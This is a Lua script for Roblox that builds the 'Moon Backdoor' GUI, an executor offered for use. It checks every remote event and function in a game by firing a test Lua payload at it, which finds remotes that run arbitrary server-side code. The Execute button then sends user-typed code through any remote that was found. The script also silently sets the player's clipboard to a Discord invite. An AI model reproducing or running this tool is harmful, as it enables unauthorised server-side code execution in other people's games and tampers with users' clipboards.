--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 33 | Scripts: 4 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.ScreenGui
G2L["1"] = Instance.new("ScreenGui", game.CoreGui);
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- StarterGui.ScreenGui.Load
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(92, 7, 123);
G2L["2"]["Size"] = UDim2.new(0, 472, 0, 49);
G2L["2"]["Position"] = UDim2.new(0.23167, 0, 0.2484, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Name"] = [[Load]];


-- StarterGui.ScreenGui.Load.LocalScript
G2L["3"] = Instance.new("LocalScript", G2L["2"]);



-- StarterGui.ScreenGui.Load.bg
G2L["4"] = Instance.new("ImageLabel", G2L["2"]);
G2L["4"]["BorderSizePixel"] = 0;
G2L["4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4"]["ImageTransparency"] = 0.4;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["4"]["ImageColor3"] = Color3.fromRGB(129, 0, 255);
G2L["4"]["Image"] = [[rbxassetid://992001116]];
G2L["4"]["Size"] = UDim2.new(0, 471, 0, 49);
G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4"]["BackgroundTransparency"] = 1;
G2L["4"]["Name"] = [[bg]];


-- StarterGui.ScreenGui.Load.bg.UICorner
G2L["5"] = Instance.new("UICorner", G2L["4"]);
G2L["5"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Load.Name
G2L["6"] = Instance.new("TextLabel", G2L["2"]);
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["TextSize"] = 36;
G2L["6"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["BackgroundTransparency"] = 1;
G2L["6"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["Text"] = [[Moon Backdoor]];
G2L["6"]["Name"] = [[Name]];
G2L["6"]["Position"] = UDim2.new(0.13347, 0, 0, 0);


-- StarterGui.ScreenGui.Load.Logo
G2L["7"] = Instance.new("ImageLabel", G2L["2"]);
G2L["7"]["BorderSizePixel"] = 0;
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["7"]["Image"] = [[rbxassetid://73958241564252]];
G2L["7"]["Size"] = UDim2.new(0, 33, 0, 38);
G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["BackgroundTransparency"] = 1;
G2L["7"]["Name"] = [[Logo]];
G2L["7"]["Position"] = UDim2.new(0.04237, 0, 0.02564, 0);


-- StarterGui.ScreenGui.Load.Logo.UIAspectRatioConstraint
G2L["8"] = Instance.new("UIAspectRatioConstraint", G2L["7"]);



-- StarterGui.ScreenGui.Load.Contains
G2L["9"] = Instance.new("TextLabel", G2L["2"]);
G2L["9"]["BorderSizePixel"] = 0;
G2L["9"]["TextSize"] = 36;
G2L["9"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9"]["BackgroundTransparency"] = 1;
G2L["9"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["9"]["Visible"] = false;
G2L["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9"]["Text"] = [[Moon Backdoor]];
G2L["9"]["Name"] = [[Contains]];
G2L["9"]["Position"] = UDim2.new(0.13347, 0, 0, 0);


-- StarterGui.ScreenGui.Load.UICorner
G2L["a"] = Instance.new("UICorner", G2L["2"]);
G2L["a"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main
G2L["b"] = Instance.new("Frame", G2L["1"]);
G2L["b"]["Visible"] = false;
G2L["b"]["BorderSizePixel"] = 0;
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(92, 7, 123);
G2L["b"]["Size"] = UDim2.new(0, 472, 0, 312);
G2L["b"]["Position"] = UDim2.new(0.23167, 0, 0.2484, 0);
G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["Name"] = [[Main]];


-- StarterGui.ScreenGui.Main.UIDrag
G2L["c"] = Instance.new("LocalScript", G2L["b"]);
G2L["c"]["Name"] = [[UIDrag]];


-- StarterGui.ScreenGui.Main.LocalScript
G2L["d"] = Instance.new("LocalScript", G2L["b"]);



-- StarterGui.ScreenGui.Main.LocalScript
G2L["e"] = Instance.new("LocalScript", G2L["b"]);



-- StarterGui.ScreenGui.Main.bg
G2L["f"] = Instance.new("ImageLabel", G2L["b"]);
G2L["f"]["BorderSizePixel"] = 0;
G2L["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f"]["ImageTransparency"] = 0.4;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["f"]["ImageColor3"] = Color3.fromRGB(129, 0, 255);
G2L["f"]["Image"] = [[rbxassetid://992001116]];
G2L["f"]["Size"] = UDim2.new(0, 471, 0, 312);
G2L["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f"]["BackgroundTransparency"] = 1;
G2L["f"]["Name"] = [[bg]];


-- StarterGui.ScreenGui.Main.bg.UICorner
G2L["10"] = Instance.new("UICorner", G2L["f"]);
G2L["10"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main.CodeBar
G2L["11"] = Instance.new("TextBox", G2L["b"]);
G2L["11"]["Name"] = [[CodeBar]];
G2L["11"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["11"]["BorderSizePixel"] = 0;
G2L["11"]["TextWrapped"] = true;
G2L["11"]["TextSize"] = 17;
G2L["11"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["11"]["BackgroundColor3"] = Color3.fromRGB(3, 3, 3);
G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["11"]["MultiLine"] = true;
G2L["11"]["ClearTextOnFocus"] = false;
G2L["11"]["PlaceholderText"] = [[print(" Moon Backdoor")]];
G2L["11"]["Size"] = UDim2.new(0, 431, 0, 202);
G2L["11"]["Position"] = UDim2.new(0.04237, 0, 0.14423, 0);
G2L["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11"]["Text"] = [[]];


-- StarterGui.ScreenGui.Main.CodeBar.UICorner
G2L["12"] = Instance.new("UICorner", G2L["11"]);
G2L["12"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main.Buttons
G2L["13"] = Instance.new("Frame", G2L["b"]);
G2L["13"]["BorderSizePixel"] = 0;
G2L["13"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13"]["Size"] = UDim2.new(0, 431, 0, 41);
G2L["13"]["Position"] = UDim2.new(0.04237, 0, 0.82051, 0);
G2L["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13"]["Name"] = [[Buttons]];
G2L["13"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Main.Buttons.UIListLayout
G2L["14"] = Instance.new("UIListLayout", G2L["13"]);
G2L["14"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["14"]["Padding"] = UDim.new(0, 19);
G2L["14"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["14"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["14"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.ScreenGui.Main.Buttons.Exe
G2L["15"] = Instance.new("TextButton", G2L["13"]);
G2L["15"]["BorderSizePixel"] = 0;
G2L["15"]["TextSize"] = 29;
G2L["15"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15"]["BackgroundColor3"] = Color3.fromRGB(69, 3, 113);
G2L["15"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["15"]["Size"] = UDim2.new(0, 205, 0, 38);
G2L["15"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15"]["Text"] = [[Execute]];
G2L["15"]["Name"] = [[Exe]];
G2L["15"]["Position"] = UDim2.new(0.2181, 0, -0.0122, 0);


-- StarterGui.ScreenGui.Main.Buttons.Exe.UICorner
G2L["16"] = Instance.new("UICorner", G2L["15"]);
G2L["16"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main.Buttons.Clear
G2L["17"] = Instance.new("TextButton", G2L["13"]);
G2L["17"]["BorderSizePixel"] = 0;
G2L["17"]["TextSize"] = 29;
G2L["17"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17"]["BackgroundColor3"] = Color3.fromRGB(69, 3, 113);
G2L["17"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["17"]["Size"] = UDim2.new(0, 205, 0, 38);
G2L["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17"]["Text"] = [[clear]];
G2L["17"]["Name"] = [[Clear]];
G2L["17"]["Position"] = UDim2.new(0.2181, 0, -0.0122, 0);


-- StarterGui.ScreenGui.Main.Buttons.Clear.UICorner
G2L["18"] = Instance.new("UICorner", G2L["17"]);
G2L["18"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main.Name
G2L["19"] = Instance.new("TextLabel", G2L["b"]);
G2L["19"]["BorderSizePixel"] = 0;
G2L["19"]["TextSize"] = 36;
G2L["19"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["19"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["19"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19"]["BackgroundTransparency"] = 1;
G2L["19"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["19"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19"]["Text"] = [[Moon Backdoor]];
G2L["19"]["Name"] = [[Name]];
G2L["19"]["Position"] = UDim2.new(0.13347, 0, 0, 0);


-- StarterGui.ScreenGui.Main.Logo
G2L["1a"] = Instance.new("ImageLabel", G2L["b"]);
G2L["1a"]["BorderSizePixel"] = 0;
G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["1a"]["Image"] = [[rbxassetid://73958241564252]];
G2L["1a"]["Size"] = UDim2.new(0, 33, 0, 38);
G2L["1a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a"]["BackgroundTransparency"] = 1;
G2L["1a"]["Name"] = [[Logo]];
G2L["1a"]["Position"] = UDim2.new(0.04237, 0, 0.02564, 0);


-- StarterGui.ScreenGui.Main.Logo.UIAspectRatioConstraint
G2L["1b"] = Instance.new("UIAspectRatioConstraint", G2L["1a"]);



-- StarterGui.ScreenGui.Main.Stats
G2L["1c"] = Instance.new("TextLabel", G2L["b"]);
G2L["1c"]["BorderSizePixel"] = 0;
G2L["1c"]["TextSize"] = 20;
G2L["1c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c"]["BackgroundTransparency"] = 1;
G2L["1c"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["1c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c"]["Text"] = [[🔴]];
G2L["1c"]["Name"] = [[Stats]];
G2L["1c"]["Position"] = UDim2.new(0.89407, 0, 0, 0);


-- StarterGui.ScreenGui.Main.Stats.UIAspectRatioConstraint
G2L["1d"] = Instance.new("UIAspectRatioConstraint", G2L["1c"]);



-- StarterGui.ScreenGui.Main.Connect
G2L["1e"] = Instance.new("TextButton", G2L["b"]);
G2L["1e"]["BorderSizePixel"] = 0;
G2L["1e"]["TextSize"] = 20;
G2L["1e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(69, 3, 113);
G2L["1e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1e"]["Size"] = UDim2.new(0, 98, 0.01, 22);
G2L["1e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e"]["Text"] = [[Connect]];
G2L["1e"]["Name"] = [[Connect]];
G2L["1e"]["Position"] = UDim2.new(0.68522, 0, 0.0387, 0);


-- StarterGui.ScreenGui.Main.Connect.UICorner
G2L["1f"] = Instance.new("UICorner", G2L["1e"]);
G2L["1f"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main.Contains
G2L["20"] = Instance.new("TextLabel", G2L["b"]);
G2L["20"]["BorderSizePixel"] = 0;
G2L["20"]["TextSize"] = 36;
G2L["20"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["20"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["20"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["20"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["20"]["BackgroundTransparency"] = 1;
G2L["20"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["20"]["Visible"] = false;
G2L["20"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["20"]["Text"] = [[Moon Backdoor]];
G2L["20"]["Name"] = [[Contains]];
G2L["20"]["Position"] = UDim2.new(0.13347, 0, 0, 0);


-- StarterGui.ScreenGui.Main.UICorner
G2L["21"] = Instance.new("UICorner", G2L["b"]);
G2L["21"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Load.LocalScript
local function C_3()
local script = G2L["3"];
	wait(3)
	local function tweenIn(frame, bg)
		if frame then
			local tweenTime = 3
	
			local tween = frame:TweenSize(
				UDim2.new(0, 472, 0, 312),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Bounce,
				tweenTime,
				true
			)
			
			local tween = bg:TweenSize(
				UDim2.new(0, 472, 0, 312),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Bounce,
				tweenTime,
				true
			)
	
			
			task.wait(tweenTime)
	
			script.Parent.Visible = false
			script.Parent.Parent.Main.Visible = true
		end
	end
	
	tweenIn(script.Parent, script.Parent.bg)
	
end;
task.spawn(C_3);
-- StarterGui.ScreenGui.Main.UIDrag
local function C_c()
local script = G2L["c"];
	-- Made by Real_IceyDev (@lceyDex) --
	-- Simple UI dragger (PC Only/Any device that has a mouse) --
	
	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end;
task.spawn(C_c);
-- StarterGui.ScreenGui.Main.LocalScript
local function C_d()
local script = G2L["d"];
	local msg = Instance.new("Message", game.Workspace)
	msg.Text = "pls join Moon Backdoor Dc!!"
	setclipboard("https://discord.gg/W5bNxXf85r")
	wait(5)
	msg:Destroy()
end;
task.spawn(C_d);
-- StarterGui.ScreenGui.Main.LocalScript
local function C_e()
local script = G2L["e"];
	-- UI references
	local buttons = {
		Exe = script.Parent.Buttons.Exe;
		clear = script.Parent.Buttons.Clear;
		connect = script.Parent.Connect;
	}
	
	local statustext = script.Parent.Stats
	local codeBar = script.Parent.CodeBar
	
	
	local statusIcons = {
		Offline = "🔴";
		Checking = "🟠";
		Allow = "🟢";
	}
	
	local function setStatus(key)
		if key == "O" then
			statustext.Text = statusIcons.Offline
		elseif key == "C" then
			statustext.Text = statusIcons.Checking
		elseif key == "B" then
			statustext.Text = statusIcons.Allow
		end
	end
	
	
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}
	
	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}
	
	
	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	
	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.split(remote:GetFullName(), ".")[1] == "RobloxReplicatedStorage" then
			print("cancelled remote:", remote:GetFullName())
			return false
		end
		if EXCLUDED_REMOTES[remote.Name] then return false end
		return true
	end
	
	local function testRemote(remote, isFunction)
		if foundExploit then return false end
		local modelName = "moon_" .. tostring(os.clock()):gsub("%.", "")
		local rs = game:GetService("ReplicatedStorage")
		local foundEvent = false
		local conn = rs.DescendantAdded:Connect(function(inst)
			if inst.Name == modelName then
				foundEvent = true
			end
		end)
		local function cleanup()
			conn:Disconnect()
			local f = rs:FindFirstChild(modelName)
			if f then f:Destroy() end
		end
		pcall(function()
			local payload = [[
				local m = Instance.new("Folder")
				m.Name = "]] .. modelName .. [["
				m.Parent = game:GetService("ReplicatedStorage")
			]]
			if isFunction then
				pcall(function() remote:InvokeServer(payload) end)
				pcall(function() remote:InvokeServer("moonTSS", payload) end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
			end
		end)
		local timeout = 1
		local start = os.clock()
		while os.clock() - start < timeout do
			if foundEvent or rs:FindFirstChild(modelName) then
				foundEvent = true
				break
			end
			task.wait(0.01)
		end
		cleanup()
		if foundEvent and not foundExploit then
			foundExploit = true
			if isFunction then
				remoteFunction = remote
			else
				remoteEvent = remote
			end
			return true
		end
		return false
	end
	
	local function simpleFindRemote()
		setStatus("C")
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		local candidates = {}
		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and isLikelyBackdoorRemote(obj) then
				table.insert(candidates, obj)
			end
		end
		print(string.format("🌙 moon: 🔍 scanning %d remotes", #candidates))
		for _, remote in ipairs(candidates) do
			if foundExploit then break end
			local ok, result = pcall(function()
				return testRemote(remote, remote:IsA("RemoteFunction"))
			end)
			if ok and result then
				print("🌙 moon: backdoor found:", remote:GetFullName())
			end
		end
		scanTime = os.clock() - os.clock()
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end
	end
	
	
	local exeConnection
	local function updateExeButton()
		if exeConnection then
			exeConnection:Disconnect()
			exeConnection = nil
		end
		if foundExploit then
			exeConnection = buttons.Exe.MouseButton1Click:Connect(function()
				local code = codeBar.Text
				if code and code ~= "" then
					if remoteEvent then
						print("ℹ️ Executing via RemoteEvent:", remoteEvent:GetFullName())
						remoteEvent:FireServer(code)
					elseif remoteFunction then
						print("ℹ️ Executing via RemoteFunction:", remoteFunction:GetFullName())
						pcall(function()
							remoteFunction:InvokeServer("moonTSS", code)
						end)
					end
					game.StarterGui:SetCore("SendNotification", {
						Title = "🌙 moon",
						Text = "Code executed through backdoor",
						Icon = "rbxassetid://73958241564252",
						Duration = 3,
					})
				else
					game.StarterGui:SetCore("SendNotification", {
						Title = "🌙 moon",
						Text = "No Code to Execute",
						Icon = "rbxassetid://73958241564252",
						Duration = 3,
					})
				end
			end)
		else
			exeConnection = buttons.Exe.MouseButton1Click:Connect(function()
				game.StarterGui:SetCore("SendNotification", {
					Title = "Moon",
					Text = "No Backdoor Found",
					Icon = "rbxassetid://73958241564252",
					Duration = 5,
				})
			end)
		end
	end
	
	buttons.connect.MouseButton1Click:Connect(function()
		setStatus("C")
		game.StarterGui:SetCore("SendNotification", {
			Title = "Moon",
			Text = "Checking for backdoors...",
			Icon = "rbxassetid://73958241564252",
			Duration = 3,
		})
		task.spawn(function()
			simpleFindRemote()
			if foundExploit then
				setStatus("B")
				game.StarterGui:SetCore("SendNotification", {
					Title = "🌙 moon",
					Text = "Backdoor found! Ready to execute.",
					Icon = "rbxassetid://73958241564252",
					Duration = 5,
				})
			else
				setStatus("O")
				game.StarterGui:SetCore("SendNotification", {
					Title = "🌙 moon",
					Text = "No backdoor found",
					Icon = "rbxassetid://73958241564252",
					Duration = 5,
				})
			end
			updateExeButton()
		end)
	end)
	
	buttons.clear.MouseButton1Click:Connect(function()
		codeBar.Text = ""
	end)
	
	setStatus("O")
	updateExeButton()local msg = Instance.new("Message", game.Workspace)
	msg.Text = "pls join Moon Backdoor Dc!!"
	setclipboard("https://discord.gg/W5bNxXf85r")
	wait(5)
	msg:Destroy()
end;
task.spawn(C_e);

return G2L["1"], require;
